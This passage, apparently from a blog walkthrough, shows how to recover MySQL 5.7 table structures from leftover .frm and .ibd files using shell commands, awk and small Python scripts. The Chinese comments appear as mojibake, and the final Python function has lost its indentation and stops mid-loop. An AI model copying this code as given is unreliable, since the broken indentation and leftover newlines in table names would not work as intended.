class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line">[root@toberoot mysql]# /alidata/mysql/bin/mysqld --initialize-insecure --datadir=/alidata/mysql/data/  --user=mysql</span><br><span class="line">[root@toberoot mysql]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot mysql]# mysql -V</span><br><span class="line">mysql  Ver 14.14 Distrib 5.7.17, for linux-glibc2.5 (x86_64) using  EditLine wrapper</span><br><span class="line"></span><br><span class="line">[root@toberoot mysql]# cd ~/home/cy02/</span><br><span class="line">[root@toberoot cy02]# ll</span><br><span class="line">total 178140</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9022 Aug 14  2017 base_dict.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar 14 15:00 base_dict.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8822 Mar  2 11:14 biz_advise.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 14 14:39 biz_advise.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8850 Mar  2 11:14 biz_bank.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar  2 11:14 biz_bank.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9580 Mar  2 11:14 biz.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9286 Mar  2 11:14 biz_gift.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Apr 24 14:08 biz_gift.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8890 Mar  2 11:14 biz_gprs_bind.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8745 Mar  2 11:14 biz_gprs_bind_his.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   180224 May 15 09:40 biz_gprs_bind_his.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   180224 May 15 09:42 biz_gprs_bind.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 14:33 biz.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8845 Aug 14  2017 biz_msg_template.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 biz_msg_template.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8881 Aug 14  2017 biz_take_bank.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 13 19:26 biz_take_bank.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9411 Nov 24 13:22 biz_take.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   196608 May 15 15:22 biz_take.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8862 Aug 14  2017 biz_take_wwlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 15:22 biz_take_wwlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8854 Aug 14  2017 biz_take_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 11:52 biz_take_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8925 Aug 14  2017 biz_vip.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar 16 09:31 biz_vip.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8852 Aug 14  2017 biz_wlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 18:30 biz_wlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8926 Aug 14  2017 biz_wx_focus.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 10 16:24 biz_wx_focus.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9339 Nov 24 13:25 biz_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 10 16:24 biz_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8874 Aug 14  2017 biz_wx_walt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 biz_wx_walt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8776 Aug 14  2017 cfg_area.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   311296 Aug 14  2017 cfg_area.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8721 Aug 14  2017 cfg_id_gen.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 18:41 cfg_id_gen.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql       61 Aug 14  2017 db.opt</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9053 Aug 14  2017 gprs_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   212992 May 15 18:47 gprs_model.ibd</span><br><span class="line">-r--r--r-- 1 mysql mysql 79691776 May 16 14:04 ibdata1</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8801 Dec 19 15:00 mbr_coin_chged.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  2097152 May 15 17:27 mbr_coin_chged.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8766 Dec 19 14:53 mbr_coin.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 19:12 mbr_coin.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9155 May 14 11:55 mbr.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   212992 May 15 20:58 mbr.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8876 Aug 14  2017 mbr_oauth.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   475136 May 15 19:37 mbr_oauth.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9011 Aug 14  2017 mbr_pay.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 mbr_pay.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8740 Aug 14  2017 mbr_prizen.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 mbr_prizen.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9147 Dec 19 14:56 mbr_recharge.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   294912 May 15 19:11 mbr_recharge.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8801 Aug 14  2017 mbr_wallet_chged.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 17:27 mbr_wallet_chged.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8845 Aug 14  2017 mbr_wallet.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   262144 May 15 19:12 mbr_wallet.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    10100 Dec 19 15:47 ord.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql 31457280 May 15 18:41 ord.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8940 Aug 14  2017 ord_item.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_item.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8917 Aug 14  2017 ord_pay_ali.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_pay_ali.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8924 Dec 19 15:55 ord_pay_coin.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   475136 May 15 17:27 ord_pay_coin.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8926 Aug 14  2017 ord_pay_return.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_pay_return.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8966 Dec 20 16:50 ord_pay_wlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 17:27 ord_pay_wlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9036 Aug 14  2017 ord_pay_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql 32505856 May 15 18:41 ord_pay_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9098 Aug 14  2017 prod_base_args.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_base_args.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8790 Aug 14  2017 prod_bug_rpt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_bug_rpt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8887 Aug 14  2017 prod_cmd.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_cmd.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8984 Aug 14  2017 prod_cmd_invoke.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_cmd_invoke.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9058 Aug 14  2017 prod_coin_rpt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 14:24 prod_coin_rpt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8798 Aug 14  2017 prod_coin_rpt_log.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 14:24 prod_coin_rpt_log.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9834 Dec 13 14:12 prod.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8835 Aug 14  2017 prod_gprs_bind.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8793 Aug 14  2017 prod_gprs_bind_his.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   196608 May 15 09:42 prod_gprs_bind_his.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_gprs_bind.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   425984 May 15 09:42 prod.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8851 Aug 14  2017 prod_instl_imgs.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_instl_imgs.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9388 Dec 13 14:13 prod_instl_pos.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   147456 May 15 16:25 prod_instl_pos.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9384 Dec 13 14:14 prod_instl_pos_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   131072 May 15 16:24 prod_instl_pos_model.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8892 Aug 14  2017 prod_mod_attr.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_attr.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8873 Aug 14  2017 prod_mod_attr_val.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_attr_val.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9642 Dec 13 14:11 prod_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 11 11:58 prod_model.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8815 Aug 14  2017 prod_mod_sku.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_sku.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9050 Aug 14  2017 prod_onl_log.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   163840 May 15 18:42 prod_onl_log.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9143 Aug 14  2017 prod_sp_args.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_sp_args.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8876 Aug 14  2017 prod_sp_arg_vals.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_sp_arg_vals.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9190 Dec 13 14:14 sys_acct.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 14 11:16 sys_acct.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8776 Aug 14  2017 sys_acct_res.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   229376 May 11 11:52 sys_acct_res.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9106 Aug 14  2017 sys_res.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 sys_res.ibd</span><br><span class="line"><span class="meta">#</span><span class="bash">è·å–å¾…æ¢å¤è¡¨å</span></span><br><span class="line">[root@toberoot cy02]# ll *.frm |awk '&#123;print $9&#125;'|awk -F '.' '&#123;print $1&#125;' &gt; /alidata/cy_table.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> pythonè„šæœ¬è‡ªåŠ¨ç”Ÿæˆå»ºè¡¨è¯­å¥</span></span><br><span class="line">[root@toberoot alidata]# cat py_createtable01.py </span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding : utf8 -*-</span></span><br><span class="line"></span><br><span class="line">def create_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    create_table_test('/alidata/cy_table.txt','/alidata/cy_sql1.sql')</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# python /alidata/py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql1.sql </span><br><span class="line">create table base_dict</span><br><span class="line"> (id int);create table biz_advise</span><br><span class="line"> (id int);create table biz_bank</span><br><span class="line"> (id int);create table biz</span><br><span class="line"> (id int);create table biz_gift</span><br><span class="line"> (id int);create table biz_gprs_bind</span><br><span class="line"> (id int);create table biz_gprs_bind_his</span><br><span class="line"> (id int);create table biz_msg_template</span><br><span class="line"> (id int);create table biz_take_bank</span><br><span class="line"> (id int);create table biz_take</span><br><span class="line">çœç•¥ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¯¼å…¥æµ‹è¯•è¡¨ç»“æ„</span></span><br><span class="line">[root@toberoot alidata]# mysql -e "show databases"</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">[root@toberoot alidata]# mysql -e "create database cy;"</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; /alidata/cy_sql1.sql </span><br><span class="line">[root@toberoot alidata]# mysql -e "desc cy.sys_res"</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11) | YES  |     | NULL    |       |</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¼€å§‹è·å–è¡¨ç»“æ„ä¸­åˆ—çš„ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# yes|cp ~/home/cy02/*.frm /alidata/mysql/data/cy/</span><br><span class="line">cp: overwrite â€˜/alidata/mysql/data/cy/base_dict.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_advise.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_bank.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_gift.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_gprs_bind.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_gprs_bind_his.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_msg_template.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_take_bank.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_take.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_take_wwlt.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_take_wx.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_vip.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_wlt.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_wx_focus.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_wx.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/biz_wx_walt.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/cfg_area.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/cfg_id_gen.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/gprs_model.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_coin_chged.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_coin.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_oauth.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_pay.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_prizen.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_recharge.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_wallet_chged.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/mbr_wallet.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord_item.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord_pay_ali.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord_pay_coin.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord_pay_return.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord_pay_wlt.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/ord_pay_wx.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_base_args.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_bug_rpt.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_cmd.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_cmd_invoke.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_coin_rpt.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_coin_rpt_log.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_gprs_bind.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_gprs_bind_his.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_instl_imgs.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_instl_pos.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_instl_pos_model.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_mod_attr.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_mod_attr_val.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_model.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_mod_sku.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_onl_log.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_sp_args.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/prod_sp_arg_vals.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/sys_acct.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/sys_acct_res.frmâ€™? cp: overwrite â€˜/alidata/mysql/data/cy/sys_res.frmâ€™? [root@toberoot alidata]# </span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# cat py_createtable01.py </span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding : utf8 -*-</span></span><br><span class="line"></span><br><span class="line">def create_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line">   </span><br><span class="line">def desc_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "desc &#123;&#125;;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    #create_table_test('/alidata/cy_table.txt','/alidata/cy_sql1.sql')</span><br><span class="line">    desc_table_test('/alidata/cy_table.txt','/alidata/cy_sql2.sql')</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py</span><br><span class="line">[root@toberoot alidata]# head cy_sql2.sql </span><br><span class="line">desc base_dict</span><br><span class="line">;desc biz_advise</span><br><span class="line">;desc biz_bank</span><br><span class="line">;desc biz</span><br><span class="line">;desc biz_gift</span><br><span class="line">;desc biz_gprs_bind</span><br><span class="line">;desc biz_gprs_bind_his</span><br><span class="line">;desc biz_msg_template</span><br><span class="line">;desc biz_take_bank</span><br><span class="line">;desc biz_take</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æˆªå–åŒ…å«åˆ—åçš„æŠ¥é”™</span></span><br><span class="line">[root@toberoot alidata]# grep contains  mysql/dataerror.log &gt; cy_error1.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŠ¥é”™æ ¼å¼å¦‚ä¸‹ï¼š</span></span><br><span class="line">2018-05-17T07:58:32.926555Z 3 [Warning] InnoDB: Table cy/base_dict contains 1 user defined columns in InnoDB, but 11 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line">2018-05-17T07:59:03.555492Z 4 [Warning] InnoDB: Table cy/biz_advise contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line">2018-05-17T07:59:03.556045Z 4 [Warning] InnoDB: Table cy/biz_bank contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å°†è¡¨åå’Œåˆ—æ•°å­˜æ”¾è‡³æ–‡ä»¶ä¸­</span></span><br><span class="line">[root@toberoot alidata]# awk '&#123;print $6,$15&#125;' cy_error1.log | awk -F '/' '&#123;print $2&#125;' &gt; cy_table_col.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ ¹æ®ä»¥ä¸Šè¡¨åå’Œåˆ—æ•°ç”Ÿæˆæ–°çš„æµ‹è¯•è¡¨</span></span><br><span class="line">def create_table_col(table_col_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_col_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    # b_list = ['t1 10','t2 20']</span><br><span class="line">    str_list = []</span><br><span class="line">    for table_col_str in b_list:</span><br><span class="line">        table_col_list = table_col_str.split()</span><br><span class="line">table = table_col_list[0]</span><br><span class="line">col = int(table_col_list[1])</span><br><span class="line">        string = "create table &#123;&#125; (".format(table)</span><br><span class="line">        str_list.append(string)</span><br><span class="line">for i in 